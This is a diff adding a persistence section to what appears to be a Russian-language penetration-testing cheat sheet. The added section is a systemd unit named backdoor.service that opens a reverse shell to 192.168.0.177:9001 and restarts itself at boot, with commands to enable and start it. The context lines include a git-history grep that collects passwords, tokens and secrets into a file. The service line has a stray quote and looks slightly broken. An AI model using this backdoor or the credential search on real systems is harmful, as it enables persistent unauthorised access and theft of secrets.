@@ -146,6 +146,26 @@ https://bgp.he.net/
 openssl rsa -noout -in суке.pem -passin 'pass:**********' 2>/dev/null && echo 'Valid' || echo 'Not Valid'
 ```
 
+***Закрепление***
+### systemd (создать файл в /lib/systemd/system/backdoor.service и Запустить его командами: sudo systemctl enable backdoor.service && sudo systemctl start backdoor.service)
+
+```
+[Unit]
+Description=Backdoor
+After=network.target ssh.service
+
+[Service]
+Type=simple
+PIDFile=/var/run/backdoor.pid
+ExecStart=sh -i >& /dev/tcp/192.168.0.177/9001 0>&1"
+Restart=always
+RestartSec=10
+
+[Install]
+WantedBy=multi-user.target
+
+```
+
 ***Поиск данных в .git***
 ```
 git log -p | findstr /i /c:"password" /c:"token" /c:"secret" /c:"пароль" /c:"basic-auth" /c:"DB_PASS" > password.txt
